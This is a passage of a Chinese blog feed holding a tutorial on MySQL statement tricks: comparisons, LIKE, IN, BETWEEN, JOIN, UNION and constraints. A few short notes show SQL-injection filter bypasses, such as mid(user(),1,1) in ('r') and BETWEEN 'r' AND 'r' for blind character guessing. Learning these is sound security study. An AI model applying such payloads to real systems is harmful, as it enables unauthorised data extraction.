<span class="keyword">where</span> <span class="keyword">id</span> &gt; <span class="number">20</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/8.png" class title="This is an test image"><p>这里就有个注意点：字符串比较的时候是逐位比较的，如一下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &gt;<span class="string">'adc'</span>;</span><br></pre></td></tr></table></figure><p>这个语句会将username列的所有字段和abc逐个比较，例如：<br>字段内容admin和abc的比较顺序：<br>admin的第一位先和abc的第一个比较，如果符合比较的条件，继续往后移位比较。<br>如果第一位不满足就退出比较，不再往后进行。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/9.png" class title="This is an test image"><p><strong>比较是按ascii的顺序进行的。</strong><br>但是我们发现上图中的结果中出现了’Admin’ A的ascii码小于a的ascii码，应该不会出现在结果集中。这是因为sql语句比较也属于弱类型的比较，所以再比较的时候会将A转换成a。<br>注意点：<br><strong>1.进行比较的支持16进制，需要在在16进制数前面加上0x，这个时候就比较就不按照ascii了，而是按照16进制的顺序进行比较的。<br>2.如果将字符串和数字进行比较，则字符串是不参与比较的，也不会显示结果集中。</strong><br>如下图：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &gt; <span class="number">0x61</span>;</span><br><span class="line">// 0x61='a'</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &gt; <span class="number">0x6165</span></span><br><span class="line">// <span class="number">0x6165</span> = <span class="string">'ad'</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/10.png" class title="This is an test image"><p>注意一点：<strong>如果比较字符和字段内容相等的时候，会继续向后比较，等到大于或小于的时候，才会停止,如下图所示</strong></p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/11.png" class title="This is an test image"><p>我们看到当和’ad’比较的时候，前几个字段前两个字符和ad相等，会继续向后比较，当比较到m的时候，’ad’就没有了字符，相当于最小的ascii码，所以就会返回admin这个字段内容。<br>而当和’admin’这个字段比较的时候，前几个字段都和admin相等，而且都比较到了尾部，所以不会返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">between</span> <span class="string">'admin'</span> <span class="keyword">and</span> <span class="string">'da4er'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/12.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'adm%'</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username regexp <span class="string">'^admin$'</span>;</span><br></pre></td></tr></table></figure><p>like和regexp相当于模糊匹配的功能</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/13.png" class title="This is an test image"><h3 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h3><p>SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。如果是数值，请不要使用引号。<br>数值使用引号引起来，就表示这个数值的ascii。                                                             <strong>文本值可以使用16进制代替，这就不需要使用引号。</strong></p><h3 id="AND-amp-OR"><a href="#AND-amp-OR" class="headerlink" title="AND&amp;OR"></a>AND&amp;OR</h3><p><strong>AND 和 OR 运算符用于基于一个以上的条件对记录进行过滤。</strong></p><blockquote><p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。<br>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。<br>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">and</span> <span class="keyword">id</span>&gt;<span class="number">7</span> ;</span><br><span class="line"> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">or</span> <span class="keyword">id</span>&gt;<span class="number">7</span> ;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/14.png" class title="This is an test image"><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>ORDER BY 语句用于对结果集进行排序。</p><p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p><p>ORDER BY 语句默认按照升序对记录进行排序。</p><p>如果您希望按照降序对记录进行排序，可以使用 DESC 关键字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">asc</span>; //默认升序</span><br><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">desc</span>; //逆序</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/15.png" class title="This is an test image"><h3 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h3><p>INSERT INTO 语句用于向表格中插入新的行。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名称 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line"></span><br><span class="line">也可以指定所要插入数据的列：</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (列<span class="number">1</span>, 列<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(username) <span class="keyword">values</span>(<span class="string">'zzzz'</span>);</span><br></pre></td></tr></table></figure><p>指定列名的话就不需要将所有列名都要赋值。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/16.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="literal">null</span>,<span class="string">'fff'</span>,<span class="string">'https://da4er.top'</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/17.png" class title="This is an test image"><p>不知道列名就要对全部列都要指定值。</p><h3 id="UPDATE语句"><a href="#UPDATE语句" class="headerlink" title="UPDATE语句"></a>UPDATE语句</h3><p>Update 语句用于修改表中的数据。</p><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 列名称=新值 <span class="keyword">where</span> 列名称=旧值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set username&#x3D;&#39;http:&#x2F;&#x2F;da4er.top&#39; where username&#x3D;&#39;111&#39;;</span><br></pre></td></tr></table></figure><p>上面这条语句就会把username=111的更新为<a href="http://da4er.top">http://da4er.top</a></p><h3 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h3><p>DELETE 语句用于删除表中的行。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名称 <span class="keyword">where</span> 列名称=值 //删除某一行</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> table_name</span><br><span class="line"><span class="keyword">delete</span> * <span class="keyword">from</span> table_name</span><br><span class="line">//删除所有行</span><br></pre></td></tr></table></figure><h3 id="TOP语句"><a href="#TOP语句" class="headerlink" title="TOP语句"></a>TOP语句</h3><p>top语句用于规定要返回的记录的数目。<br>并非所有的数据库都支持top子句。<br>sql server语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="built_in">number</span>|<span class="keyword">percent</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br></pre></td></tr></table></figure><p>mysql语法：<br>mysql中使用limit代替top</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="built_in">number</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/18.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>意思是从第一位开始读取连续的五位</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/19.png" class title="This is an test image"><p>oracle语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="built_in">number</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="LIKE语句"><a href="#LIKE语句" class="headerlink" title="LIKE语句"></a>LIKE语句</h3><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> pattern</span><br></pre></td></tr></table></figure><p>例子：<br>选取以a开头的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'a%'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/20.png" class title="This is an test image"><p><strong>提示：”%” 可用于定义通配符（模式中缺少的字母）</strong></p><p>选取以n结尾的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%n'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/21.png" class title="This is an test image"><p>选取字段中包含min的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%min%'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/22.png" class title="This is an test image"><h3 id="IN语句"><a href="#IN语句" class="headerlink" title="IN语句"></a>IN语句</h3><p>IN 操作符允许我们在 WHERE 子句中规定多个值。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">in</span>(<span class="string">'admin'</span>);</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/23.png" class title="This is an test image"><p>注入语句：<br>如果sql注入过滤了&gt;&lt;=%,regexp则可以使用in操作符。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">'r'</span>)</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/24.png" class title="This is an test image"><h3 id="BETWEEN语句"><a href="#BETWEEN语句" class="headerlink" title="BETWEEN语句"></a>BETWEEN语句</h3><p>操作符 BETWEEN … AND 会选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。SQL BETWEEN 语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name</span><br><span class="line"><span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username  <span class="keyword">between</span> <span class="string">'admin'</span> <span class="keyword">and</span> <span class="string">'da4er'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/25.png" class title="This is an test image"><p>注入语法：<br>between…and… 语法必须两个值都得满足，即两个值都要在字段中存在。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">'r'</span> <span class="keyword">and</span> <span class="string">'r'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/26.png" class title="This is an test image"><h3 id="AS语法"><a href="#AS语法" class="headerlink" title="AS语法"></a>AS语法</h3><p>通过使用 SQL，可以为列名称和表名称指定别名（Alias）。</p><p>表名的as语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name <span class="keyword">as</span> alias_name</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/27.png" class title="This is an test image"><p>列名的as语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">as</span> alias_name <span class="keyword">from</span> table_name</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">as</span> a <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/28.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> p.username,a.username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">as</span> p,<span class="keyword">member</span> <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure><p>将users取别名p，member取别名a 查询p和a的username字段。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/29.png" class title="This is an test image"><h3 id="JOIN语句"><a href="#JOIN语句" class="headerlink" title="JOIN语句"></a>JOIN语句</h3><p>SQL join 用于根据两个或多个表中的列之间的关系，从这些表中查询数据。<br><strong>join语句分为:join， inner join， left join， right join。</strong><br>mysql默认join是inner join 内连接的方式。<br>内连接：寻找连接建共同的字段显示出来。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> users.password,member.address <span class="keyword">from</span> <span class="keyword">users</span>  <span class="keyword">join</span> <span class="keyword">member</span> <span class="keyword">on</span> users.username=member.username;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/30.png" class title="This is an test image"><p>左连接：以join左边的表为基础，显示左边表的全部字段，右边与左边连接键值相等也把左边的字段显示，没有就显示null。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/31.png" class title="This is an test image"><p>右连接：以join右边的为基础</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> users.password,member.address <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">right</span> <span class="keyword">join</span> <span class="keyword">member</span> <span class="keyword">on</span> users.username=member.username;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/32.png" class title="This is an test image"><h3 id="UNION语句"><a href="#UNION语句" class="headerlink" title="UNION语句"></a>UNION语句</h3><p>UNION 操作符用于<strong>合并两个或多个 SELECT 语句的结果集</strong>。<br>请注意，<strong>UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</strong></p><p>注释：<strong>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/33.png" class title="This is an test image"><p>这里有个特性：<strong>如果union 前面没有就不会显示出来。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/34.png" class title="This is an test image"><h3 id="Create语句"><a href="#Create语句" class="headerlink" title="Create语句"></a>Create语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建数据库</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">database</span> database_name</span><br><span class="line">创建表</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> table_name(</span><br><span class="line">    列名称<span class="number">1</span> 数据类型,</span><br><span class="line">    列名称<span class="number">2</span> 数据类型,</span><br><span class="line">    列名称<span class="number">3</span> 数据类型,</span><br><span class="line">    ......</span><br><span class="line">)</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/35.png" class title="This is an test image"><h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>1.NOT NULL约束<br>NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>2.UNIQUE约束<br>UNIQUE 约束唯一标识数据库表中的每条记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> (Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>3.PRIMARY KEY 约束</p><p><strong>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</strong><br>主键必须包含唯一的值。<br>主键列不能包含 NULL 值。<br>每个表都应该有一个主键，并且<strong>每个表只能有一个主键</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><p>1.<code>count(*)</code></p><p>COUNT() 函数返回匹配指定条件的行数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure><p><code>count(*)</code>返回表中的记录数</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/36.png" class title="This is an test image"><ol start="2"><li>group by 分组查询<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">password</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/37.png" class title="This is an test image">group by 和 order by区别：<img src="/SQL%E8%AF%AD%E5%8F%A5Trick/38.png" class title="This is an test image"></li><li>having<br>增加 HAVING 子句原因是，WHERE 关键字无法与合计函数一起使用。</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">having</span> <span class="keyword">id</span> &gt; <span class="number">11</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/39.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;sql语句对大小写不敏感。&lt;/p&gt;
&lt;h3 id=&quot;show语句&quot;&gt;&lt;a href=&quot;#show语句&quot; class=&quot;headerlink&quot; title=&quot;show语句&quot;&gt;&lt;/a&gt;show语句&lt;/h3&gt;&lt;p&gt;show语句用于展示当前所有数据库或者数据表&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;databases&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;tables&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img src=&quot;/SQL%E8%AF%AD%E5%8F%A5Trick/1.png&quot; class title=&quot;This is an test image&quot;&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHPSHEv1.1代码审计</title>
    <link href="https://da4er.top/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"/>
    <id>https://da4er.top/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html</id>
    <published>2020-04-09T01:08:10.000Z</published>
